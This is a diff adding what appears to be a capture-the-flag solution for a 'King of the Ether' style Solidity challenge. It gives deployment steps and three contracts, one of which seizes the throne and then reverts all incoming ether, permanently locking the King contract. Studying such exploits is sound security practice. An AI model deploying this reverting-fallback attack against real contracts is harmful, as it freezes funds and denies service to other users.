@@ -1,0 +1,77 @@
+1. Deploy King contract with 5 wei. The deployer address is both the owner and the king and prize = 5 wei.
+2. Deploy both Player1 and Player2 contracts with 100 wei. Put King contract's address in kingContract state variable.
+3. Take turns becoming king and winning the "prize" using the Player1 and Player2 contracts.
+4. Deploy the solution contract with 100 wei. Put King contract's address in kingContract state variable.
+5. Execute Solution.attack() with an amount that is higher than the current "prize" amount. The Solution contract becomes the king.
+6. The Solution contract does a revert() on all ether transfers. This makes the King Contract unusable as now no body can change the king.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+// Send this contract some Ether while deploying
+contract Solution
+{
+    address kingContract = 0xb5465ED8EcD4F79dD4BE10A7C8e7a50664e5eeEB;
+        
+    constructor() payable {}
+    
+    function attack(uint amount) public
+    {
+        kingContract.call{value:amount * 1 wei}("");
+    }
+
+    fallback() external payable
+    {
+        revert();
+    }
+    
+    function tellBalance() public view returns (uint)
+    {
+        return address(this).balance;
+    }
+}
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+// Send this contract some Ether while deploying
+contract Player1
+{
+    address kingContract = 0xb5465ED8EcD4F79dD4BE10A7C8e7a50664e5eeEB;
+    
+    constructor() payable {}
+    
+    function play(uint amount) public
+    {
+        kingContract.call{value:amount * 1 wei}("");
+    }
+
+    fallback() external payable {}
+
+    function tellBalance() public view returns (uint)
+    {
+        return address(this).balance;
+    }
+}
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+// Send this contract some Ether while deploying
+contract Player2
+{
+    address kingContract = 0xb5465ED8EcD4F79dD4BE10A7C8e7a50664e5eeEB;
+    
+    constructor() payable {}
+    
+    function play(uint amount) public
+    {
+        kingContract.call{value:amount * 1 wei}("");
+    }
+
+    fallback() external payable {}
+
+    function tellBalance() public view returns (uint)
+    {
+        return address(this).balance;
+    }
+}
+
